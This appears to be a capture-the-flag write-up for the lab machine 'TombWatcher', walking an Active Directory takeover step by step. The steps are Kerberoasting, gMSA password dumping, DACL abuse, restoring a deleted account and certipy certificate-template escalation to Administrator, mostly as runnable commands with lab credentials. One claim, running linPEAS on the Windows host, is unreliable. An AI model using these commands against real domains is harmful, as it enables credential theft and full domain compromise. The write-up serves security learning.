# TombWatcher

```
Difficulty: Medium
Operating System: Windows
Hints: Active Directory, Kerberoasting, ACL Abuse, GMSA, DACL Abuse, Cert-based Escalation

```

## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:

```
nmap TombWatcher.htb -sV -A
PORT      STATE SERVICE         VERSION
53/tcp    open  domain          Simple DNS Plus
80/tcp    open  http            Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec    Microsoft Windows Kerberos
135/tcp   open  msrpc           Microsoft Windows RPC
139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
389/tcp   open  ldap            Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http      Microsoft Windows RPC over HTTP
636/tcp   open  ssl/ldap        Microsoft Windows Active Directory LDAP over TLS
3268/tcp  open  ldap            Microsoft Windows AD Global Catalog
3269/tcp  open  ssl/ldap        Microsoft Windows AD GC over TLS
5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (WinRM)
Domain: tombwatcher.htb
Hostname: DC01.tombwatcher.htb

```

Add to /etc/hosts:
10.10.11.72  DC01.tombwatcher.htb TombWatcher.htb
Foothold
The initial credentials provided are: henry : H3nry_987TGV!

User
Method 1 - Kerberoasting with ACL Abuse (from henry to alfred)
Recon as Henry: Use bloodhound-python to gather Active Directory information.

Bash
```
bloodhound-python -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
```
This reveals that the Alfred user has WriteSPN rights, which is exploitable via Kerberoasting.

Kerberoasting: Use targetedKerberoast.py to add a Service Principal Name (SPN) to Alfred and dump the Kerberos TGS hash.

Bash
```
python targetedKerberoast.py -v -d tombwatcher.htb -u henry -p 'H3nry_987TGV!'

```
Crack Hash: Crack the dumped hash using John the Ripper with a wordlist.

Bash

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
The password for Alfred is basketball.

```
Method 2 - GMSA Password Dump (from alfred to ansible_dev$, then SAM and john)
Recon as Alfred: Re-run bloodhound-python with Alfred's newly acquired credentials.

Bash

```
bloodhound-python -u alfred -p 'basketball' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip

```
No immediate Domain Admin path is found, but it's identified that the Infrastructure group is modifiable.

Infrastructure Group Escalation: Add Alfred to the Infrastructure group using bloodyAD.

Bash

```
bloodyAD --host '10.10.11.72' -d tombwatcher.htb -u alfred -p 'basketball' add groupMember INFRASTRUCTURE alfred
```

GMSA Password Dump: Use gMSADumper.py to find and dump Group Managed Service Account (GMSA) blobs.

Bash

python gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
This shows that the Infrastructure group can read the password for ansible_dev$.

Change Passwords via GMSA: Utilize bloodyAD to change the passwords for the SAM and john accounts by leveraging the ansible_dev$ GMSA account's dumped credentials.

Bash

```
bloodyAD --host '10.10.11.72' -d tombwatcher.htb -u 'ansible_dev$' -p ':4b21348ca4ay…' set password SAM 'jhvc@4569@'
```
```
bloodyAD --host '10.10.11.72' -d tombwatcher.htb -u SAM -p 'jhvc@4569@' set password john 'jhvc@4569@'

```
This grants access to the john account, and user.txt can be retrieved.

## Root
Once we log in as john, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors. After we run linPEAS, we can notice a path for Active Directory Certificate Services (ADCS) abuse.

DACL Abuse for OU Takeover (from john to cert_admin)
DACL Abuse: Grant john FullControl over the OU=ADCS,DC=TOMBWATCHER,DC=HTB using impacket-dacledit.

Bash
```
impacket-dacledit \
  -action write \
  -rights FullControl \
  -inheritance \
  -principal john \
  -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' \
  tombwatcher.htb/SAM:'jhvc@4569@'
```

This gives john control over the ADCS Organizational Unit.

Restore & Change cert_admin Password: Inside an Evil-WinRM session as john, identify and restore the deleted cert_admin account, enable it, and reset its password.

PowerShell
```
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
Enable-ADAccount -Identity cert_admin
Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "jhvc@4569@" -AsPlainText -Force)
```

Then, confirm the password change for cert_admin using bloodyAD.

Bash

```

bloodyAD --host '10.10.11.72' -d tombwatcher.htb \
  -u john -p 'jhvc@4569@' set password cert_admin 'jhvc@4569@'

```
The cert_admin account is now controlled.

Certificate-Based Privilege Escalation (from cert_admin to Administrator)
Cert Enumeration: Use certipy to enumerate the Certificate Authority (CA) and available certificate templates, looking for vulnerabilities.

Bash
```
certipy find -u cert_admin -p "jhvc@4569@" -dc-ip 10.10.11.72 -vulnerable
```
This reveals the WebServer template with "Enrollee supplies subject: True" and an "ESC15 vulnerability detected".

Plan A (ESC15 / ESC1): Request a certificate with Client Authentication and an Administrator UPN using certipy.

Bash
```
certipy req \
  -u 'cert_admin@tombwatcher.htb' -p 'jhvc@4569@' \
  -dc-ip '10.10.11.72' \
  -ca 'tombwatcher-CA-1' \
  -template 'WebServer' \
  -upn 'administrator@tombwatcher.htb' \
  -application-policies 'Client Authentication'
```
Then, use the generated PFX file to authenticate as the Administrator and obtain a shell.

Bash
```
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
```
From here, the Administrator's password can be changed, leading to full Domain Administrator access.

Plan B (Certificate Request Agent Attack - Alternative): If Plan A is not feasible, obtain an Agent certificate.

Bash
```
certipy req \
  -u 'cert_admin@tombwatcher.htb' -p 'jhvc@4569@' \
  -dc-ip '10.10.11.72' -ca 'tombwatcher-CA-1' \
  -template 'WebServer' \
  -application-policies 'Certificate Request Agent'
```
Then, impersonate the Administrator by requesting a user certificate on their behalf.

Bash
```
certipy req \
  -u 'cert_admin@tombwatcher.htb' -p 'jhvc@4569@' \
  -dc-ip '10.10.11.72' -ca 'tombwatcher-CA-1' \
  -template 'User' \
  -pfx cert_admin.pfx \
  -on-behalf-of 'tombwatcher\Administrator'
```
Finally, authenticate using the on-behalf-of certificate to retrieve the Administrator's TGT, ccache, or NT hash, granting Domain Administrator privileges.

Bash
```
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72
```

## Summary:

🏁 Summary of Attack Chain

```

| Step | User / Access     | Technique Used                   | Result                                   |
| :--- | :---------------- | :------------------------------- | :--------------------------------------- |
| 1    | henry             | BloodHound                       | Found SPN write rights on Alfred         |
| 2    | henry → Alfred    | Kerberoast (SPN abuse)           | Cracked Alfred’s password                |
| 3    | alfred            | BloodHound                       | Found Infrastructure group modifiable    |
| 4    | alfred            | bloodyAD                         | Added Alfred to Infrastructure           |
| 5    | alfred            | gMSADumper                       | Dumped GMSA blob                         |
| 6    | ansible_dev$      | GMSA Abuse & bloodyAD            | Changed SAM, john, user.txt              |
| 7    | john              | impacket-dacledit                | Gained FullControl on ADCS OU            |
| 8    | john              | Restore ADObject & bloodyAD      | Took over cert_admin account             |
| 9    | cert_admin        | certipy                          | Enumerated CA, WebServer template (ESC15)|
| 10   | cert_admin → DA   | cert-based escalation (ESC15/ESC1/B) | Full domain admin access (Administrator) |

```